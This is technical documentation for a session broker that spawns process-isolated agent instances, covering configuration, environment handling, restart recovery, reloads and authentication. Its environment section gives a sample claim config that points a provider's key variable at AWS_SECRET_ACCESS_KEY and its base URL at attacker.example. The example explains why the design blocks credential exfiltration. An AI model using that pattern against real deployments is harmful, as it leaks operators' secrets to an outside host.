# Session Broker

The **session broker** (`cmd/nexus-broker`) is a standalone service that fronts
many OS-isolated `nexus` instances behind a single HTTP/WebSocket ingress.
Callers *claim* an instance, talk to it over a WebSocket, and *release* it when
done. Each instance is a separate `nexus` process, so tenant isolation is
**process isolation**.

It is a protocol-aware gateway, not a blind TCP proxy: it decodes every frame
and routes by lease and signal, which is how it tracks readiness, idleness, and
crashes.

> The broker is **not** an engine plugin. It lives under `cmd/nexus-broker` and
> is built separately from `cmd/nexus`. The only plugin involved is
> [`nexus.io.broker`](../plugins/io/broker.md), which runs *inside* each spawned
> instance and dials back to the broker.

## How it works

```
                          ┌───────────────────────────────────────┐
                          │            nexus-broker               │
   client ──HTTP POST────▶│  /claim /release/{id} /ticket/{id}    │
                          │  /leases  /agents/{name}/…  (A2A)     │
          ◀──lease+ws_url─│                                       │
          ──WebSocket────▶│  /lease/{id}  ◀──frames──▶  /instance │
                          └───────────────────────────────────────┘
                                       │ exec() with env             ▲
                                       ▼                             │ dials back
                          ┌───────────────────────────────────────┐ │
                          │  nexus instance (own process)         │─┘
                          │   nexus.io.broker plugin              │
                          └───────────────────────────────────────┘
```

1. A caller `POST /claim`s with a full nexus config, optionally naming which
   `binaries:` entry to run.
2. The broker resolves that name against its registry, acquires a capacity slot,
   mints a lease, writes the config to a temp file, and **cold-spawns** that
   entry's `nexus` binary, injecting the broker address and lease id as
   environment variables.
3. The instance's [`nexus.io.broker`](../plugins/io/broker.md) plugin dials
   **back** to the broker's `/instance` endpoint, registers its lease, and
   signals ready. The broker is the only listening socket.
4. `POST /claim` returns the lease id and a `ws_url`. The caller opens that
   WebSocket and IO frames flow client ↔ broker ↔ instance.
5. The instance is released on demand (`POST /release`), on idle
   (`idle_timeout`), or on crash. The session persists on disk and is resumable.

## Running the broker

The broker reads its own YAML config file (default `broker.yaml`, override with
`-config <path>`):

```yaml
# broker.yaml
listen_addr: ":8080"          # HTTP/WS gateway bind address
advertise_addr: ""            # address CLIENTS use to reach this broker; required behind a proxy/LB
binaries:                     # named nexus variants this broker may spawn (see below)
  nexus:                      # reserved name; always present, declare it to override the path
    path: "nexus"
# nexus_binary_path: "nexus"  # DEPRECATED alias for binaries.nexus.path; still honoured
max_concurrent: 8             # max live instances; <=0 = unlimited
idle_timeout: 5m              # release a QUIET lease after this much inactivity; <=0 disables
max_turn_duration: 30m        # bound on an in-flight turn, which is otherwise exempt from idle_timeout
queue_wait_timeout: 30s       # how long an over-cap claim waits in the FIFO queue; <=0 = no waiting
max_queue_depth: 64           # how many claims may be PARKED in that queue at once; <=0 = unlimited
max_leases_per_principal: 0   # live leases one authenticated principal may hold; 0 = off
max_queued_per_principal: 0   # queued claims one authenticated principal may hold; 0 = off
release_grace: 10s            # graceful-shutdown grace before SIGTERM, then SIGKILL
ready_timeout: 30s            # ceiling on instance BOOT; raise it for a slow-starting config
session_report_grace: 5s      # post-ready wait for the instance's session id; claim still succeeds if it elapses
max_claim_body: 1048576       # ceiling on the claim request body (1 MiB); it carries the whole config
state_dir: ""                 # per-broker dir for the lease journal; empty = in-memory only
broker_id: ""                 # stamped on every lease record; generated + persisted when empty
reattach_window: 60s          # how long a lease restored after a restart waits for its instance
# auth:                       # optional; omit the block to run unauthenticated (see Authentication)
```

```bash
# build both binaries
go build -o bin/nexus ./cmd/nexus
go build -o bin/nexus-broker ./cmd/nexus-broker

# run the broker
bin/nexus-broker -config broker.yaml
```

Every config key, its type, and its default are listed in the authoritative
[Configuration Reference](../configuration/reference.md#session-broker-nexus-broker).

### Serving several `nexus` variants: the binary registry

`binaries:` is a **registry of named `nexus` variants** this broker may spawn,
keyed by the name a claim selects it by. A base build, a vision-enabled build, a
pinned older release and a wrapper script that pre-sets an environment can all
live behind one ingress.

Every entry is a **variant of `nexus`, not an arbitrary program**, because the
broker spawns them all identically and expects the same behaviour back:

- it exec()s the entry's `path` with `-config <temp file>`, plus
  `-recall <session_id>` when the claim is a [resume](#new-vs-resume);
- it injects `NEXUS_BROKER_ADDR`, `NEXUS_BROKER_LEASE_ID` and
  `NEXUS_BROKER_SPAWN_SECRET` into the child's environment;
- it waits for the process's [`nexus.io.broker`](../plugins/io/broker.md) plugin
  to dial **back** to `/instance`, register that lease, and signal ready.

A binary that does not honour that contract never signals ready, so the claim
fails with `504 instance did not become ready in time` rather than misbehaving
quietly. The registry chooses *which* build runs; it does not change the
protocol any of them speak.

```yaml
# broker.yaml
binaries:
  nexus:                                 # reserved name; declare it only to pin the path
    path: "/usr/local/bin/nexus"

  vision:
    path: "~/builds/nexus-vision"        # `~` is expanded
    label: "Nexus (vision)"              # presentational only
    description: "Multimodal build with the image tools compiled in"
    args: ["-profile", "vision"]         # appended AFTER the broker's -config / -recall
    env:
      NEXUS_VISION: "1"                  # layered UNDER the broker's NEXUS_BROKER_* vars

  pinned:
    path: "nexus-0.9"                    # no path separator → looked up on the broker's PATH
    description: "Pinned 0.9 build for regression triage"
```

**Clients do not have to be told these names out of band.** The broker publishes
its registry on [`GET /binaries`](#get-binaries--list-the-spawnable-binaries), so
a client builds its picker from live broker truth instead of hardcoding entries
that may not exist on the broker it is talking to. Only `name`, `label` and
`description` are published — `path`, `args` and `env` never leave the broker
host.

`label` and `description` are documentation for operator and client surfaces —
nothing routes on them, and consumers fall back to the entry name when `label`
is empty. `path` is the only required field. The per-field table is in the
[Binary registry reference](../configuration/reference.md#binary-registry-binaries).

`args` are **that variant's own flags**, so only set them for a build that
defines them: stock `nexus` accepts `-config`, `-recall` and `-replay` and
nothing else, and an unknown flag makes the process exit before it can dial back
— which the claim sees as `502 instance exited before signalling ready`.

**`nexus` is reserved and always resolves.** After a successful load the registry
always contains a `nexus` entry, whatever the config says — declare it to pin its
path, omit it and it is synthesized as `path: "nexus"` (a `PATH` lookup). Omit
the whole `binaries:` block and that synthesized entry is the entire registry,
which is exactly the pre-registry behaviour. There is deliberately **no
`default:` field**: a claim that names no binary always means `nexus`, so an
operator cannot silently change what an existing client spawns.

**Every entry is verified at boot**, before the gateway listens: the path is
expanded (`~`), looked up on the broker process's `PATH` when it contains no path
separator, made absolute, then stat'd and checked for an execute bit. An entry
that is missing, is a directory, or carries no execute bit **refuses the boot**,
naming the entry, the path that was resolved, and the reason. The broker logs the
resolved absolute path of every entry at startup, so a stale build shadowing the
one you meant is visible in the boot log rather than inferred later.

> **This includes the reserved `nexus` entry.** A zero-config broker whose `PATH`
> has no `nexus` now fails to start, where it previously started fine and failed
> at the first claim. The exec-bit check is a mode check, not a "can *this* user
> run it" check, so a binary executable only by another user still passes boot and
> fails at exec.

**Adding a variant does not need a restart.** Edit `binaries:` and send the
broker a `SIGHUP`: the next claim can select the new entry, `GET /binaries`
advertises it, and every live lease is untouched. See
[Changing config without a restart](#changing-config-without-a-restart-sighup).

**A variant can extend a spawn, never redirect it.** `args` are appended *after*
the broker's own `-config` / `-recall` arguments, so an entry can add flags but
cannot displace the contract the instance protocol depends on. `env` is merged
over whatever the spawn inherited from the broker, but the three `NEXUS_BROKER_*`
dial-back variables are applied **last and always win** — an entry cannot point an
instance at a different broker, hand it another lease id, or supply its own spawn
secret.

### What environment an instance is given

A spawned instance does **not** inherit the broker's environment. It is built
from nothing, in this order (later wins, since `exec` resolves a duplicated key
to its last occurrence):

| # | Source | Contents |
|---|---|---|
| 1 | Always-pass | `HOME`, `LANG`, `PATH`, `TZ`, taken from the broker regardless of config |
| 2 | `inherit_env` | Each name it lists, taken from the broker — skipped if the broker does not hold it |
| 3 | The entry's `env` | Set outright, in sorted key order |
| 4 | Broker-owned | `NEXUS_BROKER_ADDR`, `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET` |

The reason is not tidiness. A claim supplies the **whole engine config**, and a
Nexus provider resolves its credential from an environment variable that config
*names* (`api_key_env` and its equivalents) while the same config sets
`base_url`. Anything an instance holds is therefore readable *and* postable
anywhere by whoever claimed the lease:

```yaml
# a claim body's `config`
core:
  models:
    default:
      provider: openai
      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
      base_url: https://attacker.example    # where its value gets sent
```

An allowlist of *known* provider key names cannot close that, because the caller
picks the name. Only reducing the environment to what the operator declared
bounds it.

`HOME` and `PATH` are in the always-pass set for reasons that have nothing to do
with credentials: `HOME` resolves `~/.nexus`, so without it an instance cannot
create a session directory and `-recall` has nothing to resume, and `PATH` is
what makes `exec` and the shell tool work at all.

```yaml
# broker.yaml
inherit_env:                 # names only — the values come from the broker's own env
  - ANTHROPIC_API_KEY
  - OPENAI_API_KEY
```

Use `inherit_env` when the value lives in the **broker's** environment (injected
by systemd, Kubernetes, or a secrets agent) and a variant's `env` when the value
is a property of the **variant**. A claim's `config` can still carry a credential
inline, in which case neither key is involved.

At boot the broker names, per registry entry, exactly what that entry's spawns
will carry — **names only, never values**:

```
level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
  resolved_path=/opt/builds/nexus-vision \
  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
```

The line reports what will be **carried**, not what was declared, so a name
missing from it was never in the broker's own environment. Those are also
collected into one startup `WARN` naming them.

#### Migrating: instances no longer inherit the broker's environment

**This is a breaking change.** A broker that was started with
`ANTHROPIC_API_KEY` exported into its shell used to pass it to every instance it
spawned. It no longer does, and an instance whose config expects to read it will
fail to reach a provider on its first turn.

To migrate, take each variable your instances rely on and put it in one of two
places:

- it lives in the **broker's** environment → add its **name** to `inherit_env`;
- it is a property of one **variant** → set it under that entry's `env`.

```yaml
# before — worked only because the broker's whole environment was inherited
binaries:
  nexus:
    path: /usr/local/bin/nexus

# after
inherit_env:
  - ANTHROPIC_API_KEY
  - OPENAI_API_KEY
binaries:
  nexus:
    path: /usr/local/bin/nexus
```

Two things make the break loud rather than silent. The per-entry boot line above
lists everything a spawn will carry, so a variable you expected and do not see is
visible **at startup** rather than at the first turn; and a name you declared that
the broker does not actually hold is called out in its own startup `WARN`.

There is no opt-out and no compatibility flag. `inherit_env: ["*"]` is not
supported — a wildcard would restore exactly the exfiltration primitive above,
and the caller's ability to name any variable is what makes "just the risky ones"
an impossible line to draw.

**Which entry ran a session is remembered**, so a resume re-uses it instead of
falling back to `nexus`, and a resume that names a *different* variant is refused
with a `409`. That check is best-effort, with limits worth knowing before you
depend on it — see
[A resume re-uses the binary that created the session](#a-resume-re-uses-the-binary-that-created-the-session).

Full resolution rules and the boot-failure messages are in
[Binary resolution](../configuration/reference.md#binary-resolution).

#### Migrating from `nexus_binary_path`

**Nothing to do.** `nexus_binary_path` still works and existing deployments boot
unchanged — it is **deprecated**, not removed:

| Your `broker.yaml` | What happens |
|---|---|
| Neither key | `nexus` is synthesized with path `nexus`; unchanged zero-config behaviour. |
| `nexus_binary_path` only | Its value becomes `binaries.nexus.path`, and the broker logs one `WARN` naming the replacement key. |
| `binaries.nexus` only | Taken as written. This is the form to move to. |
| **Both** | **Boot failure** naming both keys. |

Setting both is refused rather than resolved by precedence: whichever rule the
broker picked, half of the operators who hit it would silently spawn the binary
they did not mean, and the mistake would only ever surface as instances behaving
oddly. Setting `nexus_binary_path: ""` is likewise a boot error, not a silent
fallback — remove the key to take the default.

Migrating is a mechanical rewrite:

```yaml
# before
nexus_binary_path: "/usr/local/bin/nexus"

# after
binaries:
  nexus:
    path: "/usr/local/bin/nexus"
```

#### What the registry deliberately does not do

- **No per-binary authentication or scoping.** [`auth:`](#authentication) gates
  routes, not entries. Any caller allowed to claim may name any registered entry,
  and [`GET /binaries`](#get-binaries--list-the-spawnable-binaries) shows every
  entry to every caller.
- **No per-binary capacity.** `max_concurrent` is one global cap across every
  variant; there is no per-entry limit or reservation.
- **No broker-side default configs.** A claim still supplies the whole engine
  config as YAML text. An entry contributes `args` and `env`, never config
  content.
- **No hot reload.** The registry is read, folded and resolved once at startup.
  Adding, changing or removing an entry means **restarting the broker**.

### Running instances as another user: `run_as`

By default a claimed instance runs as the **broker's own user**, with the
broker's `HOME`. Two claims are two processes, but they are not two principals:
either one can read the other's session directory under `~/.nexus/sessions/`,
and either can read `<state_dir>/spawn-key` — which is enough to derive any live
lease's dial-back secret and impersonate its instance.

`run_as` drops each spawn to a uid and gid you choose. It is declared per
registry entry, with a broker-level default, because the separation that matters
is between **variants**:

```yaml
# broker.yaml
run_as:                          # default for entries that declare none
  uid: 1500
  gid: 1500

binaries:
  vision:
    path: /opt/builds/nexus-vision
    run_as:                      # replaces the default outright — never merged
      uid: 1501
      gid: 1501

  support:
    path: /opt/builds/nexus-support
    run_as:
      uid: 1502
      gid: 1502
    env:
      HOME: /var/lib/nexus/support    # keep this variant's state off a home dir
```

Both `uid` and `gid` are required whenever the block is written: a uid alone
leaves instances in the broker's primary group, which looks like a boundary in
the config and is not one on disk. Ids are numeric, not names — a name resolves
against a passwd database a hardened container may not carry, and can mean
different users on two hosts. Every mistake is a **boot failure** naming the
entry and the value, like the rest of the registry.

**`HOME` follows the credential.** `HOME` is what resolves `~/.nexus`, so an
instance running as another uid while still pointed at the *broker's* home
cannot create its session directory and the claim fails at its first write. The
broker resolves the `run_as` user's home from the passwd database at boot and
hands the spawn that `HOME`. Set `env.HOME` on the entry to put that variant's
state somewhere else — a data dir under `/var/lib`, say — and that value wins.

**Where a `run_as` instance's sessions live.** In `<that HOME>/.nexus/sessions/`.
So sessions are consistent **per registry entry**: two entries under different
credentials keep their sessions in different trees, and one entry's instances all
share one. Resumes stay correct because a session already records the entry that
created it and a resume naming a different entry is refused with a `409` — see
[A resume re-uses the binary that created the session](#a-resume-re-uses-the-binary-that-created-the-session)
— so a session is never replayed under an entry whose `HOME` would not contain
it.

> **The broker must be privileged.** Setting a child's credentials — including
> the `setgroups(0, NULL)` that drops the broker's supplementary groups —
> requires **root**, or `CAP_SETUID` and `CAP_SETGID` on Linux, *even when the
> uid you name is the broker's own*. A broker that configures `run_as` without
> it logs one `WARN` at boot and fails every claim that selects such an entry at
> **spawn** — an immediate `500 spawning instance` with the refused credential in
> the broker log, not a claim that hangs until the ready timeout.

The boot log names each entry's credential and the home its sessions will live
under, beside the path and spawn environment:

```
level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
  resolved_path=/opt/builds/nexus-vision spawn_env=… run_as=1501:1501 run_as_home=/home/nexus-vision
```

#### What `run_as` does and does not buy

It buys one thing, and it is the thing the default lacks: instances run as a
**different user** from the broker and from each other's variant, so the OS —
not the broker's own bookkeeping — is what stops one from reading another's
sessions or the broker's `spawn-key`.

It does **not**:

- sandbox the filesystem, restrict the network, or cap CPU and memory. A claim
  still supplies the whole engine config, and the shell and file tools still run
  with everything that uid can reach;
- separate two instances of the **same** entry from each other — they share a
  credential and a session tree;
- protect an instance from the caller who claimed it. That caller chose its
  config and drives its tools.

Grant each `run_as` user only what its instances need, and keep the broker's
`state_dir` unreadable to them (it is `0700`, owned by the broker's user).

### Behind a proxy: set `advertise_addr`

A lease is in-memory state on **one** broker process, so the `ws_url` a claim
returns has to name that process. With a wildcard bind and no `advertise_addr`,
the broker can only guess — it derives the host from the claim request's `Host`
header.

**That is the failure this key prevents.** Behind a reverse proxy or load
balancer the `Host` header names the **intermediary**, so the returned `ws_url`
points at the load balancer rather than at the broker holding the lease. The
client then reconnects through the LB, lands on whichever broker it picks, and is
told `404 unknown lease` — by a broker that is working perfectly and simply does
not have that lease. Set `advertise_addr` to the address clients actually use to
reach **this** broker:

```yaml
listen_addr: ":8080"                              # bind wide
advertise_addr: "wss://broker-1.example.com"      # tell clients where THIS broker is
```

A bare `host:port` keeps the `ws://` scheme; the scheme-qualified form is for a
TLS-terminating proxy. Malformed values (no port, a wildcard host, a path) fail
startup, and the wildcard-bind-without-`advertise_addr` shape logs a `WARN` at
boot. A directly-reachable broker can leave the key empty. Full precedence table:
[`ws_url` resolution](../configuration/reference.md#ws_url-resolution).

**A `wss://` or `https://` `advertise_addr` also logs a `WARN` at boot** — the
broker has no TLS listener and always serves cleartext, so it is announcing a
scheme it does not itself terminate. **Behind a TLS-terminating proxy that warning
is expected and correct**: the proxy serves `wss://` to clients and forwards
cleartext to the broker, which is exactly the deployment above. The broker cannot
see whether such a proxy is in front of it, which is why this is a warning and
never a boot refusal — refusing would break the supported configuration. Treat it
as a misconfiguration only if nothing terminates TLS ahead of the broker, in which
case clients dialing `wss://` will fail to connect. To silence it on a
directly-reachable broker, advertise the scheme it actually serves (`ws://`, or a
bare `host:port`).

### Surviving a restart: set `state_dir`

Lease state — which instances this broker spawned, who claimed them, and what
session each is running — lives in memory by default, so a restart loses it and
the spawned `nexus` processes become orphans nobody can account for. Point
`state_dir` at a directory and the broker journals every lease transition to
`<state_dir>/leases.jsonl`, **and reclaims its running instances when it comes
back**:

```yaml
state_dir: "~/.nexus/broker"     # per-broker; never share one dir between brokers
broker_id: ""                    # optional name; generated and persisted when empty
reattach_window: 60s             # bound on how long a restored lease waits for its instance
```

A record is appended when a lease is minted, when its pid and session id first
become known, and when it is torn down — including on **idle sweep and crash**,
not just a manual `POST /release`. Records carry the lease id, the claiming
principal, the session id, the `binaries` entry name the instance was spawned
from, the pid, and this broker's `broker_id` / `advertise_addr`. **No secret is
ever written**: not the per-spawn secret, not a WebSocket ticket, not a bearer
token.

The durable **session → binary** mapping lives in its own file beside the
journal, `<state_dir>/session-binaries.jsonl`, and not in the journal itself. The
journal is compacted down to live leases, and a resume always arrives *after* the
original lease was released, so a binding kept only there would be gone exactly
when it is wanted. A line is written at claim time for a resume and on the
session-id report for a new session; the file is capped at 4096 bindings, oldest
dropped first, and rewritten on open and every 256 appends.

It is best-effort by design: an unknown session means *no opinion, proceed*, never
a mismatch. A session that predates the file, one whose binding was pruned, and a
broker with no `state_dir` all resume exactly as they did before it existed. A
corrupt or torn index is skipped line by line and **never prevents the broker from
booting** — an index that cannot be opened at all only logs a `WARN` and turns the
mapping off. See
[Session → binary index](../configuration/reference.md#session--binary-index-session-binariesjsonl).

The durable **A2A context → session** mapping lives in a third file,
`<state_dir>/a2a-contexts.jsonl`, written only when the broker has an
[`agents:` block](#the-a2a-front-door-agents). It is what lets a message on a
`contextId` whose instance has stopped resume the conversation after a restart
rather than starting a new one, and it follows the session → binary index in
every respect: separate from the journal for the same reason, capped at 4096
bindings with the oldest dropped first, rewritten on open and every 256 appends,
tolerant of a torn trailing record, and **never a boot failure** — an index that
cannot be opened logs a `WARN` and continuity falls back to the life of the
process. See
[Conversation lifecycle](#one-conversation-one-instance-contextid).

The journal is compacted on open and every 512 appends, so it holds roughly the
live lease set rather than the whole history. A write that fails is logged and
never fails the claim or release that produced it, and a record torn by a `kill
-9` is skipped with a warning instead of failing the file.

**The journal survives host death, not just process death.** Every append is
`fsync`ed before it returns, and compaction's rewrite fsyncs the temp file before
the rename and the directory after it, so a power loss or a hard reset cannot
lose the tail of the journal or swap a full live set for an empty one. This
matters because the tail is where the record carrying an instance's **pid**
lives: lose it and the next boot sees a lease with no pid, closes it out, and the
still-running instance becomes exactly the orphan the journal exists to prevent.

The cost is negligible and was measured against the record volume, not guessed at:
a lease writes roughly **three journal records over its whole lifetime** — minted,
pid-and-session recorded, released — so a busy broker is paying single-digit
fsyncs per lease, not per message or per turn. The barrier is unconditional
rather than applied only to the pid-bearing record: the saving would be about two
fsyncs per lease, and "which record matters" is a rule a later change can quietly
break. An `fsync` that fails follows the same policy as a write that fails — it
is logged, and it never fails the claim or the release that produced it.

**The two auxiliary indexes are deliberately not fsynced.** `session-binaries.jsonl`
and `a2a-contexts.jsonl` are best-effort by design: an unknown session or context
means *no opinion, proceed*, so losing their tail to a host crash degrades to the
behaviour those files were introduced to improve on, never to a wrong answer. The
lease journal is the only one of the three whose worst case — an unaccounted-for
running process — cannot be repaired after the fact, so it is the only one that
pays for a barrier.

Leave `state_dir` empty and the broker behaves exactly as it always has,
logging one `WARN` at startup to say lease state is in-memory only. This is
about **lease** bookkeeping, not sessions: an instance's session under
`~/.nexus/sessions/<id>/` is persisted and `-recall`-able either way.

#### What a restart actually does

Instances survive the broker's own exit because each one leads its **own process
group**: a `Ctrl-C` in the broker's terminal signals the broker's group, not the
instances', so the processes recovery expects to adopt are still there when it
comes back. (That process group is also what makes a *release* take the
instance's subprocesses with it — see
[`POST /release/{lease_id}`](#post-releaselease_id--release-an-instance).)

At boot — before any route is served — the broker replays the journal and, for
each lease that was live when it stopped:

- **The pid is still alive** → the lease is **restored**, with its original owner,
  session id and creation time, and it **re-takes its capacity slot** so
  `max_concurrent` stays honest.
- **The pid is gone**, or the lease never got a process → the record is closed out
  and forgotten.
- **The record belongs to another `broker_id`** → it is left completely alone.
  Nothing is adopted and nothing is killed.

A restored lease shows as `spawning` in `GET /leases` and is **not yet usable**.
Meanwhile the surviving instance's `nexus.io.broker` transport is already
reconnecting with exponential backoff, so it re-dials `/instance` on its own — no
instance-side configuration and no client action are involved. When it does, and
it presents the right lease id **and** the right spawn secret, the lease goes
`active` and existing clients can reconnect to the same `ws_url` and carry on.

> **A live pid is not proof of identity**, which is why a restored lease is not
> handed to whoever dials in naming it: the recorded pid may have been recycled to
> an unrelated process while the broker was down, and the portable liveness probe
> cannot tell. The [spawn secret](#the-instance-dial-back-secret) is what settles
> it — and it is required on every registration, restored or not, authenticated
> broker or not.

The secret survives the restart without ever being written down: it is **derived**
as `HMAC-SHA256(<state_dir>/spawn-key, lease_id)` rather than randomly minted, so
the restarted broker recomputes exactly what the running instance is still
holding. `spawn-key` is 32 random bytes, mode `0600`, created on first boot. It is
a *key*, not a credential — presenting it to `/instance` authenticates nothing —
and losing or rotating it is safe: derived secrets simply stop matching, and the
affected leases are reaped rather than reattached.

**Nothing waits forever.** A restored lease that no instance reconnects to within
`reattach_window` (default 60s) is reaped through the ordinary release path: the
process group is signalled (`SIGTERM`, escalating to `SIGKILL`), so the instance
and everything it started go together, the slot is freed, and the record is
closed out. Setting `reattach_window` to `0` does **not** disable
this — it falls back to the default, because an unbounded wait is the orphan the
feature exists to remove.

For the per-record detail, the exact reasons written to the journal, and the full
trade-off discussion around the derivation key, see
[Restart recovery](../configuration/reference.md#restart-recovery-reattach_window).

### Health check

```bash
curl -s http://localhost:8080/healthz
# {"status":"ok"}
```

### Changing config without a restart: `SIGHUP`

A restart is the single event that costs every lease whose instance fails to
reattach within `reattach_window`. So the two things an operator most often needs
to change — the `binaries:` registry and the `agents:` profiles — do not need
one. Send the running broker a **`SIGHUP`** and it re-reads its config file:

```bash
# add a variant to broker.yaml, then:
kill -HUP "$(pgrep -f nexus-broker)"
```

```
level=INFO msg="SIGHUP received, reloading config" path=broker.yaml
level=INFO msg="config reload applied" path=broker.yaml changed=binaries binaries=3 agents=1 ...
```

**The reload is validate-then-swap, and it is atomic.** The file goes through
exactly the loader the boot path uses, so anything that would have failed startup
fails the reload — a binary that is missing or not executable, a profile whose
config file does not resolve, an Agent Card missing a required field. Every Agent
Card is re-rendered *before* anything is published, and then the whole
configuration — the binary registry, the `GET /binaries` listing and every card —
is swapped in **one step**. A reload that fails at any point leaves the previous
configuration entirely in force and says why:

```
level=ERROR msg="config reload rejected; the configuration already in force is unchanged" path=broker.yaml error="broker config: binaries: vision: path ... is not executable"
```

There is no half-applied state, and no request can ever see one profile's
identity under another's name.

**`SIGHUP` is the only trigger.** There is no `POST /reload`: `admin_scope` is a
visibility-only capability, and a mutating admin route would be the first
exception to that rule.

#### What a reload does *not* touch

**Live leases.** A reload changes what the *next* claim can spawn. It never
signals, kills or re-binds a running instance — including one whose `binaries:`
entry was just removed. The lease records the entry *name*, the process is
already running, and a later resume against a name this broker no longer offers
is refused by the existing `409`.

**Boot-only keys.** `listen_addr`, `advertise_addr`, `state_dir`, `broker_id`,
`reattach_window`, `client_replay_buffer_bytes`, the queue and per-principal
admission caps, `a2a.tasks:` and the whole `auth:` block are read at boot and only
at boot. A reloaded file that changes one of them is **reported and ignored**:

```
level=WARN msg="config reload: these keys changed in the file but are only read at boot, so the values in force are unchanged; restart the broker to apply them" keys=listen_addr,auth
```

The reloadable keys in the same file still apply — a boot-only change is not a
reason to refuse everything around it.

`auth:` is the one worth understanding rather than just obeying. The `jwks`
validator holds a live `kid` cache with rate-limited fetches, and two of this
broker's documented guarantees rest on that cache surviving: **key rotation needs
no restart**, and **an unreachable issuer never turns into an allow**. Rebuilding
the validator chain would discard it, so a reload performed during an IdP outage
would turn a working broker into one that denies every JWT — an outage caused by
the very mechanism meant to avoid one. Credential changes are a restart.

**Turning the A2A ingress on.** A broker that booted with **no** `agents:` block
registered no A2A routes at all, and opened neither the context index nor the
durable task store. A reload therefore cannot switch the ingress on; that change
is reported and ignored like any other boot-only one. Adding, changing and
removing profiles on a broker that already serves at least one all work, and
removing the last profile is allowed — the routes then answer
`404 unknown agent profile`.

**Capacity, in one direction.** Raising `max_concurrent` immediately admits
claims already parked in the capacity queue. Lowering it never evicts anything: a
lease is a running process, and a config edit must not destroy live work. The
broker sits over its cap and admits nothing new until it drains back under, which
is the same policy restart recovery already applies.

The per-key table is in
[Reloadable keys (`SIGHUP`)](../configuration/reference.md#reloadable-keys-sighup).

## Authentication

**An absent `auth:` block means authentication is disabled**, and every route
behaves exactly as it did before authentication existed. That is the default for
an upgrading deployment, and the broker says so once at boot:

```
WARN client authentication is DISABLED: broker config has no auth block, so any
     caller that can reach this broker can claim, release and list leases
```

Opting in means adding an `auth:` block to `broker.yaml`. A **malformed** block
is a boot failure naming the offending key — it never falls back to disabled, and
unknown keys are rejected at every level.

"Disabled" is about **clients**. The instance dial-back on `WS /instance` is a
separate mechanism that this block does not govern in either direction: it always
requires the [per-spawn secret](#the-instance-dial-back-secret).

### What the block protects

| Route | With `auth:` configured |
|-------|-------------------------|
| `POST /claim`, `POST /release/{lease_id}`, `POST /ticket/{lease_id}`, `GET /leases`, `GET /binaries` | Middleware validates the credential **before** the handler runs. A refused claim spawns nothing. |
| `WS /lease/{lease_id}` | The same validator chain, resolved by the handler itself so it can also accept a single-use `?ticket=` (see [the ticket flow](#connecting-the-ticket-flow)). |
| `WS /instance` (the dial-back) | **Not covered by this block at all.** It is not a client route: a spawned instance proves itself with its [per-spawn secret](#the-instance-dial-back-secret), which is required whether or not `auth:` is configured. |
| `GET /healthz` | **Never authenticated.** A load balancer or container probe has no credential to present, and liveness leaks nothing. |

### The four validators

The `auth.validators` list is **ordered, and the first validator that accepts
wins** — so put the cheap ones first.

| `type` | Verifies | Key settings |
|--------|----------|--------------|
| `static` | A table of shared bearer tokens, compared in constant time | `tokens[]`, each with `token` + `principal` |
| `jwks` | An OIDC JWT, against the signing keys the issuer publishes | `issuer`, `jwks_url`, `audience`, `principal_claim` |
| `introspect` | An **opaque** token, by asking the issuer (RFC 7662) | `introspection_url`, `client_id`, a client secret, `principal_claim` |
| `proxy_headers` | An identity a fronting authenticating proxy already established | `trusted_proxy_cidrs`, `principal_header` |

A worked example: a shared token for CI, and OIDC access tokens for everyone
else. It is deliberately vendor-neutral — the broker is generic OIDC with **no
provider-specific defaults**, so every value below comes from your own issuer.

```yaml
# broker.yaml
listen_addr: ":8080"
advertise_addr: "wss://broker-1.example.com"

auth:
  admin_scope: "nexus.broker.admin"    # scope that unlocks the operator view of GET /leases
  validators:
    # Tried first: no network round trip.
    - type: static
      tokens:
        - token: "replace-me"
          principal: "ci-runner"
          tenant: "acme"
          scopes: "nexus.broker.admin"   # whitespace-separated, or a YAML list

    # Everyone else presents an OIDC access token.
    - type: jwks
      issuer: "https://id.example.com/"                        # exact `iss` value
      jwks_url: "https://id.example.com/.well-known/jwks.json"  # explicit; no discovery
      audience: "nexus-broker"                                  # or a list
      algorithms: ["RS256"]
      principal_claim: sub                                      # required
      tenant_claim: org_id
      scopes_claim: scope
```

Four things worth knowing before you deploy that:

- **`principal_claim` is required and has no default guess.** Lease ownership is
  principal-`ID` equality, so silently defaulting to `sub` for an issuer that
  mints a different stable identifier would bind ownership to the wrong field. A
  token whose mapped claim is absent, empty, or not a scalar is rejected.
- **There is no OIDC discovery**, on purpose — `jwks_url` is configured
  explicitly. For an issuer that documents only its discovery URL, read the value
  out once by hand:
  ```bash
  curl -s https://id.example.com/.well-known/openid-configuration | jq -r .jwks_uri
  ```
- **Key rotation needs no restart**, and an unreachable issuer never turns into an
  allow: a `kid` already in the cache keeps verifying, a `kid` that is not cached
  is denied.
- **Secrets follow one convention**: `<key>` holds the literal value, `<key>_env`
  holds the *name* of an environment variable to read it from — so
  `client_secret_env: "NEXUS_BROKER_INTROSPECTION_SECRET"` keeps the
  `introspect` client secret out of the file. **Setting both is a boot error**,
  not a precedence rule. A `broker.yaml` carrying `static` tokens or an inline
  `client_secret` is itself a secret: restrict its permissions.

An `introspect` validator that cannot reach its endpoint answers **`503` with a
`Retry-After` header**, not `401`. "We could not find out" is not a statement
about your token, and telling every client at once to re-authenticate against an
identity provider that is already failing would make an outage worse. It is still
a refusal: no lease is claimed and nothing is released.

Every key, default and validation rule is in the authoritative
[Authentication reference](../configuration/reference.md#authentication-auth).

### `proxy_headers` needs a CIDR allowlist

`type: proxy_headers` makes the broker's original deployment story — "put your own
authenticating proxy in front of it" — first-class: the proxy authenticates the
user and passes the identity down in a header.

> **⚠️ A wrong `trusted_proxy_cidrs` turns this validator into an open door.**
> A header is not a credential. Anyone who can open a TCP connection to
> `listen_addr` can send `X-Forwarded-User: <anybody>` — no signature, no expiry,
> nothing to verify. The CIDR allowlist is the *entire* security model.
>
> - **Never write `0.0.0.0/0` or `::/0`.** That is not "allow the ingress", it is
>   "let every caller on the network name themselves".
> - **List the proxy's own address, not the client's** — the allowlist is matched
>   against the peer that opened the connection, and `X-Forwarded-For` is never
>   read.
